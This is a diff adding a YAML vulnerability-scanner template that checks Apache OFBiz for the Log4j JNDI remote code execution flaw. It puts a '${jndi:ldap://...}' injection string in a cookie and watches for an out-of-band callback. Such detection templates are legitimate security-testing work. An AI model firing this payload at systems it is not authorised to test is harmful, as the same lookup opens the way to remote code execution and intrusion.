@@ -1,0 +1,20 @@
+id: apache-ofbiz-log4j-rce
+
+info:
+  name: Apache OFBiz Log4j JNDI RCE
+  author: pdteam
+  severity: critical
+
+set:
+  hostname: request.url.host
+  reverse: newReverse()
+  reverseURL: reverse.url.host
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webtools/control/main
+      headers:
+        Cookie: OFBiz.Visitor=${jndi:ldap://{{hostname}}.{{reverseURL}}}
+    expression: reverse.wait(5)
+expression:  r0()
